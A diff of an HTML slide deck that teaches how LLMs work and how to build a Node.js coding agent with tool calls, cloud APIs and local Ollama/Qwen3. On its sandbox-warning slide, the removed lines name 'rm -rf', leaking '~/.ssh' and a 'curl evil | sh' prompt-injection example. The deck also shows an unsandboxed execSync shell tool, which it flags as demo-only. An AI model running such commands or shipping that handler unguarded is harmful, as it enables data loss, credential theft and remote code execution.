@@ -104,7 +104,7 @@
         <h1>From LLMs to Your Own Coding Agent</h1>
         <h3 class="muted">LLM basics → coding agent → local demo</h3>
         <p><span class="pill">LLM basics</span><span class="pill">Agent loop</span><span class="pill">Node.js</span><span class="pill">Claude / Gemini / GPT</span><span class="pill">Ollama + Qwen3</span></p>
-        <p class="muted"><small>Use ← / → arrows to navigate · press <strong>S</strong> for speaker notes · <strong>F</strong> for fullscreen · <strong>ESC</strong> for overview</small></p>
+        <p class="muted"><small>← / → navigate · <strong>S</strong> notes · <strong>F</strong> fullscreen · <strong>ESC</strong> overview</small></p>
       </section>
 
       <!-- 2. INTRODUCTION / ABOUT -->
@@ -151,7 +151,7 @@
             <h3 class="good" style="margin:2px 0 0;">Offline &amp; free</h3>
           </div>
         </div>
-        <aside class="notes">Goal: by the end, everyone understands the mental model AND has a working agent they can point at a cloud API or a local model.</aside>
+        <aside class="notes">Goal: by the end, everyone understands the mental model and has a working agent they can point at either a cloud API or a local model. Rough timing for 150 minutes: 45 minutes foundations, 60 minutes Node.js build/demo, 35 minutes Ollama/Qwen3 + homework, 10 minutes Q&amp;A/buffer.</aside>
       </section>
 
       <!-- ===================== PART 1 ===================== -->
@@ -165,11 +165,11 @@
         <h2>What is an LLM?</h2>
         <div style="display:grid; grid-template-columns: 6fr 6fr; gap:36px; align-items:start; font-size:0.82em;">
           <div>
-            <p>A <strong class="accent">Large Language Model</strong> is a neural net trained on huge text to do one deceptively simple thing:</p>
+            <p>A <strong class="accent">Large Language Model</strong> is trained on huge text to do one thing well:</p>
             <blockquote class="big" style="font-size:1.1em;">Given some text, predict the <span class="accent2">next token</span>.</blockquote>
             <ul>
-              <li>A <strong>token</strong> ≈ a word / word-piece</li>
-              <li>It scores <strong>every</strong> possible next token, then picks one</li>
+              <li><strong>Token</strong> ≈ word / word-piece</li>
+              <li>Scores possible next tokens, then picks one</li>
               <li>Repeat → sentences, code, answers</li>
             </ul>
           </div>
@@ -219,13 +219,13 @@
             </svg>
           </div>
         </div>
-        <aside class="notes">Everything else — chat, reasoning, coding — is an emergent behavior of "predict the next token" done extremely well at scale. The bars show the model doesn't "know" the answer; it estimates a distribution and samples from it.</aside>
+        <aside class="notes">Everything else — chat, reasoning, coding — emerges from next-token prediction done extremely well at scale. The bars show the model estimates a distribution; it does not retrieve one fixed answer.</aside>
       </section>
 
       <!-- 3b. Tokens / tokenization -->
       <section>
         <h2>Tokens — how a model reads text</h2>
-        <p class="muted">Models read <b class="accent">tokens</b>: small chunks of text, not full words.</p>
+        <p class="muted">Models read <b class="accent">tokens</b>: chunks of text, not whole words.</p>
         <div style="display:flex; flex-wrap:wrap; gap:8px; justify-content:center; align-items:center; font-family:ui-monospace,Menlo,monospace; font-size:0.82em; margin:26px 0 14px;">
           <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">I</span>
           <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">&nbsp;love</span>
@@ -235,11 +235,11 @@
           <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">!</span>
           <span style="color:#8b97a7; margin-left:10px;">→ 6 tokens</span>
         </div>
-        <p class="muted" style="text-align:center;"><small>One word (<b class="accent2">"tokenizers"</b>) can split into several tokens — and a leading space is part of the token.</small></p>
+        <p class="muted" style="text-align:center;"><small>One word can split into several tokens; leading spaces count too.</small></p>
         <div class="cols3" style="margin-top:20px;">
-          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">✂️</span><h3>≈ ¾ word</h3><p><small>~100 tokens ≈ 75 English words. Code &amp; rare words cost more tokens.</small></p></div>
-          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💰</span><h3 class="accent2">You pay per token</h3><p><small>Cloud APIs bill input + output tokens. More context = more money.</small></p></div>
-          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🪟</span><h3 class="good">Context = token budget</h3><p><small>The "context window" is counted in tokens — the agent's working memory.</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">✂️</span><h3>≈ ¾ word</h3><p><small>~100 tokens ≈ 75 English words. Code often costs more.</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💰</span><h3 class="accent2">Pay per token</h3><p><small>Cloud APIs bill input + output. More context = more cost.</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🪟</span><h3 class="good">Context budget</h3><p><small>The context window is the agent's working memory.</small></p></div>
         </div>
         <aside class="notes">Tokenization uses byte-pair encoding (BPE). Devs care because tokens drive both cost and the context-window limit.</aside>
       </section>
@@ -247,27 +247,27 @@
       <!-- 3c. Sampling & temperature -->
       <section>
         <h2>Why the same prompt gives different answers</h2>
-        <p class="muted">Remember the probability bars? The model returns a <b>distribution</b>, not one answer. <b class="accent">Sampling</b> picks from it; <b class="accent2">temperature</b> sets how adventurous.</p>
+        <p class="muted">The model returns a <b>distribution</b>, not one fixed answer. <b class="accent">Sampling</b> picks; <b class="accent2">temperature</b> controls variety.</p>
         <div class="cols" style="margin-top:14px;">
           <div class="card">
             <span class="ico" style="font-size:1.4em; display:block; margin-bottom:2px;">❄️</span>
             <h3 class="accent" style="margin-bottom:6px;">temperature = 0</h3>
-            <p><small><b>Repeatable</b> · deterministic. <span class="good">✔ Best for code, tools, structured output.</span></small></p>
+            <p><small><b>Repeatable</b> · deterministic. <span class="good">Best for code, tools, structured output.</span></small></p>
           </div>
           <div class="card">
             <span class="ico" style="font-size:1.4em; display:block; margin-bottom:2px;">🔥</span>
             <h3 class="accent2" style="margin-bottom:6px;">temperature ≈ 0.7 – 1.0</h3>
-            <p><small><b>Varied</b> · creative, different each run. <span class="muted">✔ Ideas, writing, brainstorming.</span></small></p>
+            <p><small><b>Varied</b> · creative, different each run. <span class="muted">Good for ideas and writing.</span></small></p>
           </div>
         </div>
-        <blockquote style="margin-top:14px;"><small>Same question, run twice, different reply? Not a bug — that's sampling. For your <b>coding agent</b>, keep temperature <b class="accent">low</b>.</small></blockquote>
+        <blockquote style="margin-top:14px;"><small>Same prompt, different reply? That's sampling. For <b>coding agents</b>, keep temperature <b class="accent">low</b>.</small></blockquote>
         <aside class="notes">Other knobs: top-p (nucleus) and top-k trim the candidate set before sampling. Temperature reshapes the distribution: 0 ≈ argmax, higher = flatter.</aside>
       </section>
 
       <!-- 4. How it works step by step -->
       <section>
         <h2>How an LLM works — step by step</h2>
-        <p class="muted">One token at a time, in a loop:</p>
+        <p class="muted">One token at a time:</p>
         <svg viewBox="0 0 1090 330" style="width:100%; max-width:1060px; height:auto; display:block; margin:0 auto;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="LLM pipeline">
           <defs>
             <marker id="ahP" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
@@ -352,7 +352,7 @@
       <!-- 5. Training -->
       <section>
         <h2>How does it "learn"? Three stages</h2>
-        <p class="muted">A plain text-predictor is gradually shaped into a helpful assistant:</p>
+        <p class="muted">A text-predictor becomes an assistant in stages:</p>
         <svg viewBox="0 0 1090 300" style="width:100%; max-width:1060px; height:auto; display:block; margin:0 auto;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="Training stages">
           <defs>
             <marker id="ahT" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
@@ -416,17 +416,17 @@
         <div class="cols3">
           <div class="card">
             <h3><span style="margin-right:8px;">🪟</span>Context window</h3>
-            <p><small>How much text it can "see" at once — its short-term memory.</small></p>
+            <p><small>How much text it can see at once.</small></p>
             <span class="eg">e.g. ~200K tokens ≈ a 500-page book in one go.</span>
           </div>
           <div class="card">
             <h3><span style="margin-right:8px;">⚙️</span>System prompt</h3>
-            <p><small>Hidden instructions that set its role &amp; rules.</small></p>
+            <p><small>Hidden instructions: role, rules, style.</small></p>
             <span class="eg">e.g. <code>system: "You are a terse Python expert. Reply in code only."</code></span>
           </div>
           <div class="card">
             <h3><span style="margin-right:8px;">💰</span>Tokens = cost</h3>
-            <p><small>You pay per token — for input <b>and</b> output.</small></p>
+            <p><small>Input and output both count.</small></p>
             <span class="eg">e.g. ~1,000 tokens ≈ 750 English words ≈ a short email.</span>
           </div>
         </div>
@@ -457,12 +457,12 @@
           </div>
           <div class="card">
             <h3><span style="margin-right:8px;">🫥</span>No memory</h3>
-            <p><small><b>Context must be resent.</b></small></p>
+            <p><small><b>Resend context each call.</b></small></p>
             <span class="eg">new chat → forgets you</span>
           </div>
           <div class="card">
             <h3><span style="margin-right:8px;">🚫</span>Can't act</h3>
-            <p><small><b>Needs tools to do anything.</b></small></p>
+            <p><small><b>Needs tools to act.</b></small></p>
             <span class="eg">writes <code>npm test</code>, can't run it</span>
           </div>
         </div>
@@ -477,13 +477,13 @@
             <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💬</span>
             <h3>Plain LLM</h3>
             <p><small>You ask → it replies with text.</small></p>
-            <p class="muted"><small>It can <i>write</i> code, but it can't run it, read your files, or fix its own mistakes.</small></p>
+            <p class="muted"><small>It can <i>write</i> code, but not run it or inspect files.</small></p>
           </div>
           <div class="card">
             <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🤖</span>
             <h3 class="accent2">Coding Agent</h3>
-            <p><small>An LLM in a <b>loop</b>, given <b>tools</b> and a <b>goal</b>.</small></p>
-            <p class="muted"><small>It can read files, edit code, run commands, see the output, and try again — until the task is done.</small></p>
+            <p><small>An LLM in a <b>loop</b> with <b>tools</b> and a <b>goal</b>.</small></p>
+            <p class="muted"><small>Reads files, edits code, runs commands, observes, retries.</small></p>
           </div>
         </div>
         <blockquote><b>Coding agent = LLM + tools + a loop + a goal.</b> That's the whole trick.</blockquote>
@@ -492,7 +492,7 @@
       <!-- 7c. Anatomy -->
       <section>
         <h2>Anatomy of a coding agent</h2>
-        <p class="muted">Think: a fast <b class="accent2">junior dev</b> — task + tools + feedback loop. Five simple parts:</p>
+        <p class="muted">Think: a fast <b class="accent2">junior dev</b> with tools and feedback. Five parts:</p>
         <aside class="notes">The junior-dev analogy: the task you hand them = the user prompt (goal); their keyboard &amp; terminal = tools (read/write/run); team guidelines = the system prompt; try→test→fix = the agent loop; their brain &amp; experience = the LLM. The one difference: it "thinks" by predicting text, and runs the whole loop in seconds.</aside>
         <div class="anat">
           <div class="card"><span class="ico">🧠</span><h3>Brain</h3><p>The LLM. Decides what to do next.</p></div>
@@ -501,7 +501,7 @@
           <div class="card"><span class="ico">📝</span><h3>Memory</h3><p>The message history sent each turn.</p></div>
           <div class="card"><span class="ico">🎯</span><h3>Goal</h3><p>The user's task + the system prompt rules.</p></div>
         </div>
-        <p class="muted"><small>Take away the tools → it's just a chatbot. Take away the loop → it can only act once. Both together → an agent.</small></p>
+        <p class="muted"><small>No tools → chatbot. No loop → one-shot script. Together → agent.</small></p>
       </section>
 
       <!-- 8. The agent loop -->
@@ -514,7 +514,7 @@
           <span class="muted">│</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>4. Observe</b> — feed the tool's result back to the LLM<br/>
           <span class="accent">└──</span> <b>5. Repeat</b> until the LLM says "done" (no more tool calls)
         </div>
-        <p><b>Tools</b> = functions you expose to the model (name + description + JSON parameters). The model doesn't run them — <span class="accent">it asks, your code executes.</span></p>
+        <p><b>Tools</b> = functions you expose. The model asks; <span class="accent">your code executes.</span></p>
         <aside class="notes">This loop is 90% of what Claude Code, Cursor, Aider, etc. do under the hood. The rest is polish: better prompts, more tools, safety checks, UI.</aside>
       </section>
 
@@ -578,13 +578,13 @@
           <text x="470" y="28" text-anchor="middle" fill="#f0a35e" font-size="15">tool result → appended to history, loop again ↺</text>
         </svg>
         </div>
-        <p class="muted" style="text-align:center;"><small>The orange dashed arrow is the <b>loop</b>: every tool result is fed back so the model keeps going until it's done.</small></p>
+        <p class="muted" style="text-align:center;"><small>The orange arrow is the loop: tool result → history → next model call.</small></p>
       </section>
 
       <!-- 8a. How a tool call actually works -->
       <section>
         <h2>How a "tool call" actually works</h2>
-        <p class="muted">The #1 confusion. The model <b>never</b> runs code — it just <i>asks</i>, in structured text.</p>
+        <p class="muted">Key point: the model <b>never</b> runs code. It asks in structured text.</p>
         <div class="loop">
           <span class="step">1.</span> You tell the model which tools exist <span class="muted">(name + description + params)</span><br/>
           <span class="step">2.</span> Instead of plain text, the model can reply: <span class="accent2">"call <b>read_file</b> with <code>{path:'app.js'}</code>"</span><br/>
@@ -592,16 +592,16 @@
           <span class="step">4.</span> You paste the result back into the conversation<br/>
           <span class="step">5.</span> The model reads the result and decides the next step
         </div>
-        <p><span class="accent">Tool call = a structured request. Your code decides whether to execute it.</span></p>
+        <p><span class="accent">Tool call = structured request. Your code decides what runs.</span></p>
         <aside class="notes">The LLM is the decider; your program is the doer — the "tool call" is just JSON the model emits and you interpret. This separation is why agents are safe-ish: nothing runs unless YOUR code chooses to run it. You can log, sandbox, or ask for approval in between.</aside>
       </section>
 
       <!-- 8b. Walkthrough: a real task step by step -->
       <section>
         <h2>The flow, step by step 🎬</h2>
-        <p class="muted">Task: <em>"Add a <code>subtract()</code> function to <code>math.js</code> and prove it works."</em></p>
+        <p class="muted">Task: <em>"Add <code>subtract()</code> to <code>math.js</code> and prove it works."</em></p>
         <div class="trace">
-          <div class="msg user"><span class="who">USER</span> Add a <code>subtract()</code> function to <code>math.js</code> and prove it works.</div>
+          <div class="msg user"><span class="who">USER</span> Add <code>subtract()</code> to <code>math.js</code> and prove it works.</div>
           <div class="msg bot"><span class="who">AGENT</span> Let me see the file first. <em>→ calls <code>read_file({ path: "math.js" })</code></em></div>
           <div class="msg tool"><span class="who">TOOL</span> read_file → "export const add = (a, b) =&gt; a + b;"</div>
           <div class="msg bot"><span class="who">AGENT</span> I'll append subtract. <em>→ calls <code>write_file({ path: "math.js", content: "…" })</code></em></div>
@@ -610,13 +610,13 @@
           <div class="msg tool"><span class="who">TOOL</span> run_command → "2"</div>
           <div class="msg done"><span class="who">AGENT</span> ✅ Done — added <code>subtract()</code>; calling <code>subtract(5, 3)</code> returned 2 as expected.</div>
         </div>
-        <p class="muted"><small>Each grey/green line is appended to the history, so every turn the model sees everything that happened so far.</small></p>
+        <p class="muted"><small>Each tool result is appended, so the model sees what happened.</small></p>
       </section>
 
       <!-- 8c. Self-correction -->
       <section>
         <h2>Why the loop is powerful: self-correction</h2>
-        <p class="muted">The magic isn't one perfect answer — it's <b>seeing the result and trying again</b>.</p>
+        <p class="muted">The power is not one perfect answer. It is <b>observe → retry</b>.</p>
         <div class="trace">
           <div class="msg bot"><span class="who">AGENT</span> Run the tests. <em>→ calls <code>run_command({ cmd: "node test.js" })</code></em></div>
           <div class="msg tool"><span class="who">TOOL</span> run_command → "❌ ReferenceError: subtract is not defined"</div>
@@ -626,31 +626,31 @@
           <div class="msg tool"><span class="who">TOOL</span> run_command → "✅ All 3 tests passed"</div>
           <div class="msg done"><span class="who">AGENT</span> ✅ Fixed the missing <code>export</code>; all tests pass now.</div>
         </div>
-        <p><span class="accent">Feed the error back → the model debugs itself.</span> That feedback loop is what makes agents feel smart.</p>
+        <p><span class="accent">Feed the error back → the model can debug itself.</span></p>
       </section>
 
       <!-- 8b. Terminology: the three roles -->
       <section>
         <h2>Terminology — the conversation</h2>
-        <p class="muted">Every message in the loop has a <b>role</b>. This "conversation history" is the agent's memory.</p>
+        <p class="muted">Every message has a <b>role</b>. History is the agent's memory.</p>
         <div class="cols3">
           <div class="card">
             <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">⚙️</span>
             <h3>system</h3>
-            <p><small>Sets the agent's behavior, rules, and available context. Written once, front-loaded.</small></p>
+            <p><small>Behavior, rules, and context.</small></p>
           </div>
           <div class="card">
             <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🙋</span>
             <h3>user</h3>
-            <p><small>The human's request / task, plus tool results fed back in.</small></p>
+            <p><small>The request, plus tool results.</small></p>
           </div>
           <div class="card">
             <span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🤖</span>
             <h3>assistant</h3>
-            <p><small>The LLM's reply — either a text answer <b>or</b> a request to call a tool.</small></p>
+            <p><small>Text answer or tool request.</small></p>
           </div>
         </div>
-        <p class="muted"><small>The loop = read input → append to history → send to LLM → run any tool → append result → repeat.</small></p>
+        <p class="muted"><small>Loop = append input → ask model → run tool → append result → repeat.</small></p>
         <aside class="notes">Matches the Stanford CS146S framing: system/user/assistant prompts; the client executes tool calls outside the LLM.</aside>
       </section>
 
@@ -658,7 +658,7 @@
       <section class="title" data-background-color="#101820">
         <div class="kicker">Part 2</div>
         <h1 class="accent2">Build a coding agent in Node.js</h1>
-        <p class="muted">~80 lines. Works with Claude, Gemini, GPT — and later, a local model.</p>
+        <p class="muted">~80 lines. Cloud now, local later.</p>
       </section>
 
       <!-- 8z. What we're about to build (chat mockup) -->
@@ -677,7 +677,7 @@
           </div>
           <div class="composer"><span>Ask your agent to do something…</span><span class="send">Send</span></div>
         </div>
-        <p class="muted" style="text-align:center;"><small>In ~80 lines of Node.js you'll build exactly this: a chat box that can <b>read</b>, <b>edit</b>, and <b>run</b> code.</small></p>
+        <p class="muted" style="text-align:center;"><small>In ~80 lines of Node.js: <b>read</b>, <b>edit</b>, <b>run</b>, then reply.</small></p>
       </section>
 
       <!-- 9. Prereqs / setup -->
@@ -692,14 +692,14 @@ npm install openai               # OpenAI GPT  (also talks to Ollama!)
 npm install @anthropic-ai/sdk    # Anthropic Claude
 npm install @google/genai        # Google Gemini
 </code></pre>
-        <p class="muted"><small>Requires <b>Node 18+</b> (you have v24). Put your key in an env var, never in code:
+        <p class="muted"><small>Requires <b>Node 18+</b>. Put keys in env vars, never code:
         <code>export OPENAI_API_KEY=sk-...</code></small></p>
       </section>
 
       <!-- 10. Step 1 basic call - three providers -->
       <section>
         <h2>Step 1 — Say hello to a model</h2>
-        <p class="muted">Same idea in every SDK — send messages, get text back.</p>
+        <p class="muted">Same pattern in every SDK: messages in, text out.</p>
         <div class="cols3" style="gap:16px;">
           <div>
             <p class="step">OpenAI (GPT)</p>
@@ -746,15 +746,15 @@ console.log(r.text);
 </code></pre>
           </div>
         </div>
-        <p class="muted"><small>Keys come from env vars (<code>OPENAI_API_KEY</code>, …). We'll build the full agent with the <b>OpenAI SDK</b> — the same code drives <b>Ollama / Qwen3</b> locally later.</small></p>
-        <blockquote style="margin-top:12px;"><small>💡 The <b class="accent">OpenAI SDK is a de-facto standard</b>: most services expose an <b>OpenAI-compatible</b> endpoint — Ollama, Groq, DeepSeek, Mistral, xAI, OpenRouter, even Gemini &amp; Claude via a compat layer. Change the <code>baseURL</code>, keep the code. <span class="muted">(Mostly for chat completions — some advanced features still differ.)</span></small></blockquote>
+        <p class="muted"><small>Keys come from env vars. We'll use the <b>OpenAI SDK</b>; the same code drives <b>Ollama / Qwen3</b> later.</small></p>
+        <blockquote style="margin-top:12px;"><small><b class="accent">OpenAI-compatible</b> endpoints are common. Change <code>baseURL</code>, keep the agent loop. <span class="muted">Advanced features can still differ.</span></small></blockquote>
         <aside class="notes">This is why we standardize on the OpenAI SDK for the rest of the talk: one code path reaches almost every provider — cloud or local. Compatibility is strongest for the chat-completions endpoint; provider-specific extras (fine-grained tool-calling, structured outputs) can vary, so check each provider's docs for the edges.</aside>
       </section>
 
       <!-- 11. Step 2 define tools -->
       <section>
         <h2>Step 2 — Describe the tools</h2>
-        <p class="muted">A tool is just a name + description + parameters. This is what the model reads.</p>
+        <p class="muted">A tool = name + description + parameters. The model reads this.</p>
         <pre><code data-trim data-noescape class="language-javascript">const tools = [
   {
     name: "read_file",
@@ -773,13 +773,13 @@ console.log(r.text);
   },
 ];
 </code></pre>
-        <p class="muted"><small>(Simplified. The real OpenAI/Claude SDKs want a slightly more verbose JSON-schema shape — same idea.)</small></p>
+        <p class="muted"><small>Simplified; real SDKs use JSON Schema.</small></p>
       </section>
 
       <!-- 12. Step 2b implement tools -->
       <section>
         <h2>Step 2b — Implement the tools</h2>
-        <p class="muted">Plain Node functions — the "hands" of the agent.</p>
+        <p class="muted">Plain Node functions: the agent's hands.</p>
         <pre><code data-trim data-noescape class="language-javascript">import fs from "node:fs/promises";
 import { execSync } from "node:child_process";
 
@@ -789,13 +789,13 @@ const handlers = {
   run_command: ({ cmd })           => execSync(cmd).toString(),
 };
 </code></pre>
-        <p class="muted"><small>Note: <code>run_command</code> runs real shell commands — in production you'd sandbox it or ask for approval first.</small></p>
+        <p class="muted"><small><code>run_command</code> is real shell access. Sandbox or require approval.</small></p>
       </section>
 
       <!-- 12c. One call to the model WITH tools (demo) -->
       <section>
         <h2>Step 2c — Call the model <em>with tools</em> 🎬</h2>
-        <p class="muted">Before the loop: what happens in <b>one</b> call once the model has tools?</p>
+        <p class="muted">Before the loop: one model call with tools.</p>
         <pre><code data-trim data-noescape class="language-javascript">const messages = [
   { role: "user", content: "Create hello.js that prints 'hi'." },
 ];
@@ -806,14 +806,14 @@ const reply = await callModel(messages, tools);
 console.log(reply.tool_calls);
 // → [{ name: "write_file",
 //      args: { path: "hello.js", content: "console.log('hi')" } }]</code></pre>
-        <p><span class="accent">The model didn't create the file</span> — it asked your program to call <code>write_file()</code>. Put this call in a loop → agent. ↓</p>
+        <p><span class="accent">The model did not create the file</span>; it requested <code>write_file()</code>. Loop this → agent. ↓</p>
         <aside class="notes">This is the single most important idea in the talk. The LLM never touches your machine — it returns a tool_calls array and stops; the client decides whether to execute it. Great spot for the live demo: run this once against Qwen3 4B and show the tool_calls output. Step 3 literally just loops this call and feeds each tool result back into messages.</aside>
       </section>
 
       <!-- 13. Step 3 the loop -->
       <section>
         <h2>Step 3 — The agent loop</h2>
-        <p class="muted">This is the whole flow. Read it top to bottom.</p>
+        <p class="muted">The whole flow, top to bottom.</p>
         <pre><code data-trim data-noescape class="language-javascript">const messages = [
   { role: "system", content: "You are a coding agent. Use tools to finish the task." },
   { role: "user",   content: "Create hello.js that prints 1 to 10, then run it." },
@@ -856,7 +856,7 @@ model: Done. Created hello.js and ran it.</code></pre>
       <!-- 14b. Put it all together -->
       <section>
         <h2>Step 5 — Put it all together</h2>
-        <p class="muted">The whole thing is one file, <code>agent.js</code> — the 4 pieces from Steps 1–3 wired up:</p>
+        <p class="muted"><code>agent.js</code> wires together four pieces:</p>
         <pre style="font-size:0.4em;"><code data-trim data-noescape class="language-javascript">import OpenAI from "openai";
 
 const openai = new OpenAI();                       // 1 · the model client
@@ -883,13 +883,13 @@ while (true) {                                     // 4 · the loop
     messages.push({ role: "tool", tool_call_id: call.id, content: String(result) });
   }
 }</code></pre>
-        <p class="muted"><small>Run it: <code>node agent.js "Create hello.js that prints 1 to 10, then run it"</code> — that's the whole agent. It runs, but a bare prompt is fragile — let's make it reliable ↓</small></p>
+        <p class="muted"><small>Run it: <code>node agent.js "Create hello.js that prints 1 to 10, then run it"</code>. It works; now make it reliable ↓</small></p>
       </section>
 
       <!-- 14b2. Refine the prompt: constraints + stop condition -->
       <section>
         <h2>Step 6 — Add rules + stop condition</h2>
-        <p class="muted">A bare prompt works in the demo but drifts on real tasks. Two levers make it reliable: <b class="accent">constraints</b> + a <b class="accent2">stop condition</b>.</p>
+        <p class="muted">A bare prompt drifts. Add <b class="accent">constraints</b> and a <b class="accent2">stop condition</b>.</p>
         <pre style="font-size:0.44em;"><code data-trim data-noescape class="language-javascript">const SYSTEM = `You are a coding agent. Use tools to finish the task.
 
 Rules:                     // ← guide the model
@@ -901,33 +901,33 @@ Done:                      // ← when to stop calling tools
 - Verify after changes.
 - Final answer only after verification.
 - If stuck, explain why and stop.`;</code></pre>
-        <p class="muted"><small>Also cap the loop: <code>while (n++ &lt; 20) { … }</code>. <b>Rules guide the model; the loop cap protects your program.</b></small></p>
+        <p class="muted"><small>Also cap the loop: <code>while (n++ &lt; 20) { … }</code>. Rules guide; caps protect.</small></p>
         <aside class="notes">The stop condition tells the model when to stop requesting tools and return a final answer (the loop ends when the model replies without tool_calls). Important: the prompt only *guides* the model — the workspace boundary, the approval gate, and the loop cap must be <b>enforced by your code</b>. An agent can't truly "ask approval" unless your tool runner supports it. Mirrors the homework's workspace + approval requirements.</aside>
       </section>
 
       <!-- 14c. Sandbox / this is a demo -->
       <section>
         <h2>⚠️ It's a demo — real agents need a sandbox</h2>
-        <p class="muted"><code>run_command</code> runs <b>whatever the model says</b>, straight on your machine — fine for learning, risky for real tasks.</p>
+        <p class="muted"><code>run_command</code> runs model-chosen commands on your machine: fine for learning, risky for real work.</p>
         <div class="cols">
           <div class="card">
             <h3 class="accent2">Why that's risky</h3>
             <ul style="font-size:0.8em;">
-              <li><b>Hallucination</b> → a destructive command <span class="muted">(<code>rm -rf</code>, overwrite files)</span></li>
-              <li><b>Prompt injection</b> → a file/webpage tells it to leak <code>~/.ssh</code> or run <code>curl evil | sh</code></li>
-              <li><b>No undo</b> — by the time you see it, it already ran</li>
+              <li><b>Hallucination</b> → destructive command</li>
+              <li><b>Prompt injection</b> → leak keys or run hostile code</li>
+              <li><b>No undo</b> — it already ran</li>
             </ul>
           </div>
           <div class="card">
             <h3 class="good">What a sandbox gives you</h3>
             <ul style="font-size:0.8em;">
-              <li><b>Isolation</b> — a container/VM that can't touch your real files or keys</li>
-              <li><b>Restricted network</b>, resource &amp; time limits, non-root</li>
-              <li>Plus <b>command allow-list</b> &amp; <b>human approval</b> for risky actions</li>
+              <li><b>Isolation</b> — container/VM, no real files or keys</li>
+              <li><b>Limits</b> — network, time, resources, non-root</li>
+              <li><b>Control</b> — allow-list + human approval</li>
             </ul>
           </div>
         </div>
-        <p class="muted" style="text-align:center; margin-top:10px;"><small>For this course: run it on a <b>throwaway folder</b>. For real use → <b>sandbox the tools</b> (Docker, a VM, or a hosted agent runtime).</small></p>
+        <p class="muted" style="text-align:center; margin-top:10px;"><small>Course demo: use a <b>throwaway folder</b>. Real use: <b>sandbox the tools</b>.</small></p>
       </section>
 
       <!-- 15. Provider comparison -->
@@ -938,9 +938,9 @@ Done:                      // ← when to stop calling tools
           <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💸</span><h3 class="accent">Cheap cloud</h3><p><small><b>Gemini Flash</b> / <b>DeepSeek</b> — low cost · free tiers</small></p></div>
           <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🖥️</span><h3 class="good">Local</h3><p><small><b>Ollama + Qwen3</b> — free · offline · private</small></p></div>
         </div>
-        <p class="muted" style="margin-top:18px;">Same agent loop for all three — swap the SDK / <code>baseURL</code>, keep the code.</p>
-        <p class="muted"><small><span class="accent2">Note:</span> some chat-only models (e.g. Gemma 3) have <b>no</b> tool calling — avoid them for agents. Full model &amp; price tables next ↓ <i>(reference)</i></small></p>
-        <aside class="notes">Cloud in full — Anthropic Claude Opus/Sonnet (top coding &amp; agents), OpenAI GPT-5.5 / 5.4 (huge ecosystem), Google Gemini 2.5 (cheap, free tier), xAI Grok 4, DeepSeek V3 (very cheap), Mistral Large (EU). Local via Ollama — Qwen3 (our pick: strong local tool-calling), gpt-oss, Llama 3.3/4, DeepSeek-R1, Devstral. Most support tool/function calling depending on provider &amp; runtime.</aside>
+        <p class="muted" style="margin-top:18px;">Same loop: swap SDK / <code>baseURL</code>, keep the agent logic.</p>
+        <p class="muted"><small><span class="accent2">Note:</span> chat-only models without tool calling are poor agent choices. Price table next is reference only.</small></p>
+        <aside class="notes">Use this as a decision slide, not a model catalog. Cloud: strongest quality and managed infrastructure, but paid. Cheap cloud: good for experiments and student budgets. Local: slower/weaker than frontier models, but private, free per token, and perfect for learning the agent loop. Verify current model names/prices on official docs before presenting.</aside>
       </section>
 
       <!-- 15b. Pricing -->
@@ -962,7 +962,7 @@ Done:                      // ← when to stop calling tools
             <tr><td class="good"><b>Ollama + Qwen3</b></td><td>qwen3:4b (local)</td><td class="good">$0</td><td class="good">$0</td><td class="good"><b>free &amp; offline</b></td></tr>
           </tbody>
         </table>
-        <p class="muted" style="margin-top:6px;"><small>Approx. list prices / 1M tokens (~mid-2026) — <b>verify on each provider's page</b>.</small></p>
+        <p class="muted" style="margin-top:6px;"><small>Approx. list prices / 1M tokens — <b>verify on provider docs before class</b>.</small></p>
         <aside class="notes">Agents make many calls, so cost adds up — you pay per token, input + output. Batch &amp; cached tiers are cheaper; local models cost only your own hardware/electricity. This slide is a reference — skim it live, don't read every row.</aside>
       </section>
 
@@ -970,32 +970,32 @@ Done:                      // ← when to stop calling tools
       <section class="title" data-background-color="#101820">
         <div class="kicker">Part 3</div>
         <h1 class="good">Offline &amp; free with Ollama + Qwen3</h1>
-        <p class="muted">Run a capable model on your own machine. No API key, no bill, no data leaving your laptop.</p>
+        <p class="muted">Run a capable model locally: no API key, no bill, no data leaves your laptop.</p>
       </section>
 
       <!-- 16. Why local -->
       <section>
         <h2>Why run a model locally?</h2>
-        <p class="muted">Four reasons developers keep a local model around:</p>
+        <p class="muted">Why developers keep a local model around:</p>
         <div class="anat" style="grid-template-columns: repeat(4, 1fr); margin-top: 10px;">
           <div class="card"><span class="ico">💸</span><h3 class="good">Free</h3><p>No per-token bill, ever.</p></div>
           <div class="card"><span class="ico">🔒</span><h3 class="good">Private</h3><p>Your code never leaves the machine.</p></div>
           <div class="card"><span class="ico">✈️</span><h3 class="good">Offline</h3><p>Works on a plane or air-gapped.</p></div>
           <div class="card"><span class="ico">♾️</span><h3 class="good">Unlimited</h3><p>Experiment as much as you want.</p></div>
         </div>
